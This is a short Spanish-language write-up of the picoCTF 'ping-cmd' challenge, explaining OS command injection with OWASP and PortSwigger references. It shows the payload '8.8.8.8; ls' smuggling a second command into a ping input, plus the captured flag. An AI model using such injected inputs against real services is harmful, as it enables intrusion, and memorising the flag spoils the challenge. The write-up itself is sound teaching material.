## ping-cmd
## Descripcion
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?You can connect to the service here `nc mysterious-sea.picoctf.net 62516`
## Solucion
#### Prueba de inyección

Se introdujo:
8.8.8.8; ls

Resultado:
flag.txt  
script.sh

✔ Confirmando que la inyección funcionaba.
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_ddce97d3}
## Notas
#### ¿Qué es Command Injection?

La **inyección de comandos** es una vulnerabilidad donde un atacante puede ejecutar comandos del sistema operativo debido a una mala validación de entradas.
👉 Ocurre cuando una aplicación usa funciones como:

- `system()`
- `exec()`
- `popen()`

sin sanitizar correctamente la entrada del usuario.
## Referencias
- OWASP  
    [https://owasp.org/](https://owasp.org/)
    
- OWASP Top 10  
    [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
- Command Injection - PortSwigger  
    [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
    
- Linux command injection guide  
    [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)

- `nc` (netcat)
- comandos de Linux (`ls`, `cat`)
- operadores de shell (`;`)